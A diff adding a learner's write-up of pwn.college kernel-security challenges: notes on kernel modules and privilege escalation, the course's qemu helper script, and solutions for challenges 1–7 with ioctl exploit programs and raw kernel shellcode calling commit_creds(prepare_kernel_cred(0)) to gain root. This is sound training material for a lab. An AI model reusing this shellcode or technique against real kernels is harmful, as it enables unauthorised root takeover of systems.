@@ -39,6 +39,427 @@ The following links may also come handy: [link1][setup1], [link2][setup2], [link
 
 ### Kernel Modules
 
+Libraries that loads into the kernel. ELF files (`.ko`), similar to userspace library (`.so`). Loaded to the address space of the kernel (as libraries loaded to the address space of the program). They are being used in order to implement drivers, filesystems, networking, etc. \
+We can see loaded modules via `lsmod`, and load via `insmod module.ko`, which under the hood calls the `init_module` syscall. These can be interacted via syscalls. Historically, modules COULD add syscall entries within the syscall table, but this is explicitly unsupported nowadays. Theoretically, module could also register interrupt handler (using `LIDT, LGDT`), and writing its own entry within. This means that upon issuing `int 42` from a userspace program, the module's hook may hit. For example, `int 80` used to invoke the syscall handler within x86. Module can also hook interrupt instructions, such as `int3, int1` (meaning, instead of `int3` sending a SIGTRAP, do something else). Interestingly, module can also hook the invalid opcode exception interrupt. \
+However, the common ways of actually interacting with modules are files:
+
+1. `/dev` - for traditional devices
+
+2. `/proc` - in addition to running process information, contains disastrous mess of **kernel** interfaces. 
+
+3. `/sys` - non-process information interace with the kernel 
+
+Module can register a file in one of these virtual filesystems, and a user can `open` it. From kernel space, we can R/W a file via `device_read, device_write`, working on `struct file` instead of file descriptors. \
+Besides the classic R/W interface, there's a more flexible interface - `ioctl`. Can be used from userspace via `ioctl(fd, CODE, &custom_struct)`, or from kernelspace (on `struct file`) via `device_ioctl`. \
+Typically, driver would read data from userspace (`copy_from_user`), would do stuff (interact with HW, etc), writes data back to userspace (`copy_to_user`), and return to userspace. \
+Notice that incase we're interacting with a driver from the shell, it might be usefull to use `dd if=/dev/driver of=/proc/self/fd/1 bs=128 count=1`. 
+
+### PE
+
+Recall the two important functions `copy_to_user, copy_from_user`. \
+Kernel memory must be kept uncorrupted. Hence, user data should be carefully handled. What would we like to achieve? Usually, PE. Recall the kernel tracks the user privileges of every running process by `task_struct->real_cred` and `task_struct->cred` (effective, overwriteable). In particular, `struct cred->euid` may be overwritten. \
+We can ask the kernel to create a fresh `struct cred` by calling `prepare_kernel_cred(struct task_struct *ref)`, which by default of `NULL` argument would allocate a cred struct with root access and full privileges. In order to register that new cred struct, we shouldn't update the previous struct in-place (as they can be cached elsewhere), but instead we should call `commit_creds(struct cred*)`. Hence, `commit_creds(prepare_kernel_cred(0))` would get the job done. \
+How can we figure out these symbols addresses? Usually there's KASLR, so they would be randomized for every reboot. Also, `/proc/kallsyms` requires root access and contains these addresses. Another trick is to forge an exploit to navigate towards the VA space that is being used by `kallsyms`. 
+
+### Memory Management
+
+Recall each process has the kernel code mapped in the "upper half" of memory. \
+The kernel maintains mapping between process VA, and the actual addresses they correspond to in PA.
+
+2:24
+
+
+
+### Kernel Shellcode
+
+For PE, the classic goto is `commit_creds(prepare_kernel_cred(0))`. \
+For seccomp escape, `current_task_struct->thread_info.flags &= ~(1 << TIF_SECCOMP)` (turn off the seccomp bit). \
+For arbitrary command execution, `run_cmd("/path/to/command")`. 
+
+This means we can just use the kernel's API. \
+However, notice that the regular `call` instruction takes a **relative 32-bit offset** to shift execution by. This means that if we'd like to execute userspace-allocated shellcode, we'd have to use indirect call: `mov rax, bla; call rax`. \
+Notice that we can actually exploit the relative nature of a regular `call addr` - since we're running within the kernel, it means that we might not be needing a leak, as long as we know the relative constant offset between our shellcode to our target function. \
+Regarding seccomp escaping, recall the kernel points to the `current` task struct using the `gs` register. By writing a small snippet that parses the `current` within a kernel module and reverse engineering it, we can learn how our target architecture retrieves `&current->thread_info.flags`- and mimic this behavior. \
+Moreover, notice we'd like the shellcode to exit cleanly. This means, for a function pointer hijacking, we'd like the shellcode to behave as a regular function - having prologe and epiloge. For more complicated exploits, we'd like a full state-recovery stage within the shellcode.
+
+## Setup
+
+Pwn-college have developed some cool infrastructure to debug the kernel. The main component is a python script named `vm`, which wraps many repetitive operations. These includes:
+
+1. `vm connect` - initiates the kernel by running `qemu` emulator in background, then connecting to it via `ssh`. 
+
+```python
+def start():
+    flags = " ".join(flag for flag in extra_boot_flags())
+
+    bzImage = "/challenge/bzImage" if os.path.exists("/challenge/bzImage") else "/opt/linux/bzImage"
+
+    kvm = os.path.exists("/dev/kvm")
+    cpu = "host" if kvm else "qemu64"
+    qemu_argv = [
+        "/usr/bin/qemu-system-x86_64",
+        "-kernel", bzImage,
+        "-cpu", f"{cpu},smep,smap",
+        "-fsdev", "local,id=rootfs,path=/,security_model=passthrough",
+        "-device", "virtio-9p-pci,fsdev=rootfs,mount_tag=/dev/root",
+        "-fsdev", "local,id=homefs,path=/home/hacker,security_model=passthrough",
+        "-device", "virtio-9p-pci,fsdev=homefs,mount_tag=/home/hacker",
+        "-device", "e1000,netdev=net0",
+        "-netdev", "user,id=net0,hostfwd=tcp::22-:22",
+        "-m", "2G",
+        "-smp", "2" if kvm else "1",
+        "-nographic",
+        "-monitor", "none",
+        "-append", f"rw rootfstype=9p rootflags=trans=virtio console=ttyS0 init=/opt/pwn.college/vm/init {flags}",
+    ]
+    if kvm:
+        qemu_argv.append("-enable-kvm")
+
+    if is_privileged():
+        qemu_argv.append("-s")
+
+    argv = [
+        "/usr/sbin/start-stop-daemon",
+        "--start",
+        "--pidfile", "/run/vm/vm.pid",
+        "--make-pidfile",
+        "--background",
+        "--no-close",
+        "--quiet",
+        "--oknodo",
+        "--startas", qemu_argv[0],
+        "--",
+        *qemu_argv[1:]
+    ]
+
+    subprocess.run(argv,
+                   stdin=subprocess.DEVNULL,
+                   stdout=open("/run/vm/vm.log", "a"),
+                   stderr=subprocess.STDOUT,
+                   check=True)
+```
+
+We can see how it implements mounting the host user & root directories. Moreover, we can see it forwards port `22`, to enable ssh into the machine. If privileged, it also runs a `gdbserver`, and finally - stores all output within `/run/vm/vm.log`. \
+It also sets the kernel command line via `-append`, which sets an `init` file to be used. The `init` file does multiple important things, including mounting all the virtual filesystems, networking configuration, and loading all of the kernel modules under `/challenge`. 
+
+2. In a similar manner, if the vm have already been started, we can debug it as follows:
+
+```python
+def debug():
+    try:
+        socket.create_connection((vm_hostname(), 1234), timeout=30)
+    except ConnectionRefusedError:
+        error("Error: could not connect to debug")
+
+    vmlinux = "/challenge/vmlinux" if os.path.exists("/challenge/vmlinux") else "/opt/linux/vmlinux"
+
+    execve([
+        "/usr/bin/gdb",
+        "--ex", "target remote localhost:1234",
+        vmlinux,
+    ])
+```
+
+Hence, launches a simple `gdb` client. This means we can use gdb scripts to ease debugging. Moreover, by default challenges run on kernel `5.4`. 
+
+3. We can build kernel modules as follows:
+
+```python
+def build(path):
+    ruid, euid, suid = os.getresuid()
+    os.seteuid(ruid)
+
+    with open(path, "r") as f:
+        src = f.read()
+
+    with tempfile.TemporaryDirectory() as workdir:
+        with open(f"{workdir}/debug.c", "w") as f:
+            f.write(src)
+
+        with open(f"{workdir}/Makefile", "w") as f:
+            f.write(
+                textwrap.dedent(
+                    f"""
+                    obj-m += debug.o
+
+                    all:
+                    \tmake -C /opt/linux/linux-5.4 M={workdir} modules
+                    clean:
+                    \tmake -C /opt/linux/linux-5.4 M={workdir} clean
+                    """
+                )
+            )
+
+        subprocess.run(["make", "-C", workdir], stdout=sys.stderr, check=True)
+
+        os.seteuid(euid)
+        shutil.copy(f"{workdir}/debug.ko", "/challenge/debug.ko")
+```
+
+This means that the source of our module is being compiled and set at the `/challenge/` dir automatically. 
+
+## Challenge 1
+
+I've first connected into the vm. By issuing `vm debug`, we can see the vm freezes, and we can debug kernel addresses:
+
+```bash
+(gdb) x/10i $rip
+=> 0xffffffff81ab299e <default_idle+30>:        mov    ebp,DWORD PTR gs:[rip+0x7e55d9ab]        # 0x10350 <cpu_number>
+   0xffffffff81ab29a5 <default_idle+37>:        nop    DWORD PTR [rax+rax*1+0x0]
+   0xffffffff81ab29aa <default_idle+42>:        pop    rbx
+   0xffffffff81ab29ab <default_idle+43>:        pop    rbp
+   0xffffffff81ab29ac <default_idle+44>:        pop    r12
+   0xffffffff81ab29ae <default_idle+46>:        ret    
+```
+
+There's one kernel module that have been loaded:
+
+```bash
+hacker@vm_practice~kernel-security~level1-0:~$ lsmod
+Module                  Size  Used by
+challenge              16384  0
+```
+
+And the module's binary is given within `/challenge/babykernel_level_1.0.ko`. By reading `kallsyms` as root (we can do this in practice mode, as we can obtain root on our host machine), we can see addresses of some interesting module's symbols:
+
+```bash
+$ sudo cat /proc/kallsyms | grep challenge
+ffffffffc0000952 t device_release       [challenge]
+ffffffffc0000967 t device_open  [challenge]
+ffffffffc000097c t device_write [challenge]
+ffffffffc0000a0a t device_read  [challenge]
+ffffffffc0000000 t bin_padding  [challenge]
+ffffffffc0000940 t cleanup_module       [challenge]
+ffffffffc0000870 t init_module  [challenge]
+
+$ sudo cat /proc/modules
+challenge 16384 0 - Live 0xffffffffc0000000 (O)
+
+$ sudo cat /sys/module/challenge/sections/.bss
+0xffffffffc0002440
+```
+
+By doing some trivial RE, we can see within `init_module` that the module reads the flag into the module's `.bss` section. Interestingly, the kernel doesn't loads all of the kernel module's binary as one big chunk. Instead, it maps every region (`.text, .data, etc`) with padding in between. 
+
+```bash
+(gdb) x/s 0xffffffffc0002460
+0xffffffffc0002460:     "pwn.college{practice}\n
+```
+
+Moreover, it registers a `proc_dir_entry` named `pwncollege` with custom `fops`. While `device_release, device_open` aren't implemented, `device_read, device_write` does. \
+The `write` handler actually checks if the user had given some certain secret bytes to the `proc` file, and if so, changes a `device_state` variable, also located within the `.bss` of the module. The `read` handler checks for that state's value, and if it is adequate - prints the flag's content. \
+Hence, the following would give us the flag:
+
+```bash
+echo "qqypfbyywqmzhfcn" > /proc/pwncollege
+cat /proc/pwncollege
+```
+
+## Challenge 2
+
+Now, there's no `read` handler at all. However, there's comparision being made at `0xffffffffc0000c88`, checking if the inserted input matches some magic. In case it succeeds, `printk` is being called at `0xffffffffc0000c9f`. \
+By inspecting the values of `printk` parameters, we can see the format string is misaligned - 
+
+```bash
+(gdb) x/s $rdi
+0xffffffffc0001270:     "\001\066The flag is: %s\n"
+(gdb) x/s $rsi
+0xffffffffc0002460:     "pwn.college{practice}\n"
+```
+
+But this shouldn't matter, as the `printk` call does succeedds, and doesn't stop at `\x01`. The idea here, is the fact that `write` handler doesn't uses `copy_to_user`, but actually prints to the kernel's logs, as can be found in `dmesg`. 
+
+```bash
+echo yjtvotvfhmaybgnh > /proc/pwncollege
+dmesg
+```
+
+## Challenge 3
+
+Now there's a `win` function, that gives us `uid = 0` upon inserting the secret
+
+```bash
+echo eixspnzdawplvwnw > /proc/pwncollege
+whoami
+cat /flag
+```
+
+## Challenge 4
+
+Now we have to interact with the driver via `ioctl`. \
+Writing a short `.c` program can be very helpful in this case (compiled via `-static`):
+
+```c
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+int main()
+{
+    int res = 0;
+
+    int fd = open("/proc/pwncollege", 0);
+    if (fd < 0)
+    {
+        goto cleanup;
+    }
+
+    long cmd = 1337;
+    const char *arg = "czmepuekljhzwqou";
+    if (ioctl(fd, cmd, arg) < 0)
+    {
+        goto cleanup;
+    }
+
+    char *const argv[] = { "/bin/sh", 0 };
+    execve(argv[0], argv, 0);
+
+    return 0;
+
+cleanup:
+    return 1;
+}
+```
+
+Important - notice that in case we run the script within a shell, the CHILD process is the one who's `uid` is set to `0`. Hence, the parent (shell) would still have high `uid`. 
+
+## Challenge 5
+
+Pretty cool - now the address that is stored within `arg` is being called. Hence, we have arbitrary branch primitive within the kernel. \
+By reading `/proc/kallsyms` we can see `win` is stored at `0xffffffffc000022d`. 
+
+```c
+int fd = open("/proc/pwncollege", 0);
+    if (fd < 0)
+    {
+        goto cleanup;
+    }
+
+    long cmd = 1337;
+    uint64_t arg = 0xffffffffc000022d;
+    if (ioctl(fd, cmd, arg) < 0)
+    {
+        goto cleanup;
+    }
+
+    char *const argv[] = { "/bin/sh", 0 };
+    execve(argv[0], argv, 0);
+```
+
+## Challenge 6
+
+Now the module allocates using `vmalloc` a single page of memory that may be written and executed. \
+This means we have to write a kernel shellcode. The idea is simple - `commit_creds(prepare_kernel_cred(0))`. \
+The main obstacle with this challenge, is the fact that in addition to the state-recovery we have to perform by creating a new function's frame, we must also make sure the `rsp` alignment stays the same. Otherwise, the process would get killed by the kernel. That's why I've added extra `push rbx; pop rbx` instructions:
+
+
+```c
+int main()
+{
+    int res = 0;
+    int fd = open("/proc/pwncollege", O_RDWR);
+    if (fd < 0)
+    {
+        goto cleanup;
+    }
+
+    /* Simple commit_creds(prepare_creds(0)) shellcode, having prologe and epiloge
+    push rbx
+    push rbp
+    mov rbp, rsp
+    xor rdi, rdi
+    mov rbx, 0xffffffff81089660
+    call rbx
+    mov rdi, rax
+    mov rbx, 0xffffffff81089310
+    call rbx
+    mov rsp, rbp
+    pop rbp
+    pop rbx
+    ret    
+    */
+    uint8_t shellcode[0x1000] = { 0x53, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x31, 0xFF, 0x48, 0xC7, 0xC3, 0x60, 0x96, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xC7, 0x48, 0xC7, 0xC3, 0x10, 0x93, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0xC3 };
+    
+    if (write(fd, shellcode, sizeof(shellcode)) < 0)
+    {
+        goto cleanup;
+    }
+
+    char *const argv[] = { "/bin/sh", 0 };
+    execve(argv[0], argv, 0);
+}
+```
+
+## Challenge 7
+
+This one is pretty funny. The driver reads from the user a single pointer towards user buffer. \
+It assumes the buffer's layout is having its `length` as the first 8 bytes, the shellcode as the next bytes (which should be up to `0x1000` bytes), and an address to jump into (the shellcode address). \
+However, the shellcode size verification is only being made according to the user-supplied `length` value, not the length of the shellcode itself. 
+
+```c
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdint.h>
+#include <string.h>
+
+#define SHELLCODE_SIZE 0x1000
+
+int main()
+{
+    int res = 0;
+
+    int fd = open("/proc/pwncollege", O_RDONLY);
+    if (fd < 0)
+    {
+        goto cleanup;
+    }
+
+    /* Simple commit_creds(prepare_creds(0)) shellcode, having prologe and epiloge
+    push rbx
+    push rbp
+    mov rbp, rsp
+    xor rdi, rdi
+    mov rbx, 0xffffffff81089660
+    call rbx
+    mov rdi, rax
+    mov rbx, 0xffffffff81089310
+    call rbx
+    mov rsp, rbp
+    pop rbp
+    pop rbx
+    ret    
+    */
+    uint8_t shellcode[SHELLCODE_SIZE] = { 0x53, 0x55, 0x48, 0x89, 0xE5, 0x48, 0x31, 0xFF, 0x48, 0xC7, 0xC3, 0x60, 0x96, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xC7, 0x48, 0xC7, 0xC3, 0x10, 0x93, 0x08, 0x81, 0xFF, 0xD3, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0xC3 };
+    size_t length = SHELLCODE_SIZE;
+    size_t execute_addr = 0xffffc90000085000;
+
+    uint8_t arg[sizeof(length) + sizeof(shellcode) + sizeof(execute_addr)] = { 0 };
+    memcpy(arg, &length, sizeof(length));
+    memcpy(arg + sizeof(length), &shellcode[0], sizeof(shellcode));
+    memcpy(arg + sizeof(arg) - sizeof(size_t), &execute_addr, sizeof(execute_addr));
+
+    long cmd = 1337;
+    if (ioctl(fd, cmd, arg) < 0)
+    {
+        goto cleanup;
+    }
+
+    char *const argv[] = { "/bin/sh", 0 };
+    execve(argv[0], argv, 0);
+
+    return 0;
+
+cleanup:
+    return 1;
+}
+```
+
+## Challenge 8
 
 
 
